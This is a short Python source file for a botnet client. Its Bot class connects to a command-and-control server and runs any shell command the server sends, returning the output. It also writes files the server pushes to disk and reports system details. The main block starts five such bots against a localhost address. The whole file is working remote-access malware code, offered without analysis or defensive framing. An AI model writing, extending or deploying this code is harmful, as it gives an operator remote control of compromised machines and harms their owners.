import socket
import threading
import subprocess
import platform

class Bot:
  # init
    def __init__(self, bot_id, server_ip, server_port):
        self.bot_id = bot_id
        self.server_ip = server_ip
        self.server_port = server_port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self):
        try:
            self.client.connect((self.server_ip, self.server_port))
            print(f"[+] Bot {self.bot_id} connected to the C2 Server.")

            while True:
                task = self.client.recv(4096).decode('utf-8')
                if not task:
                    break

                if task == 'ping':
                    self.client.send(f'[+] Bot {self.bot_id}: Pong!'.encode('utf-8'))

                elif task.startswith('run_command:'):
                    cmd = task.split(':', 1)[1]
                    try:
                        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
                    except subprocess.CalledProcessError as e:
                        output = str(e)
                    self.client.send(f'[+] Bot {self.bot_id}: {output}'.encode('utf-8'))

                elif task.startswith('file_transfer:'):
                    file_name = task.split(':', 1)[1]
                    with open(file_name, 'wb') as file:
                        file_data = self.client.recv(4096)
                        file.write(file_data)
                    self.client.send(f"[+] Bot {self.bot_id}: File {file_name} received.".encode('utf-8'))

                elif task == 'system_info':
                    system_info = platform.platform()
                    self.client.send(f'[+] Bot {self.bot_id}: {system_info}'.encode('utf-8'))

        except Exception as e:
            print(f"[-] Bot {self.bot_id} encountered an error: {e}, Please check the Server and Try again.")
        finally:
            self.client.close()

def create_bot(bot_id, server_ip, server_port):
    bot = Bot(bot_id, server_ip, server_port)
    bot.start()

if __name__ == '__main__':
    server_ip = '127.0.0.1'
    server_port = 9999

    # create 5 bots (u can change the ammount down in the for i in range loop)
    bot_threads = []
    for i in range(5):
        bot_thread = threading.Thread(target=create_bot, args=(i + 1, server_ip, server_port))
        bot_threads.append(bot_thread)
        bot_thread.start()

    # wait for all bot threads to finish
    for thread in bot_threads:
        thread.join()
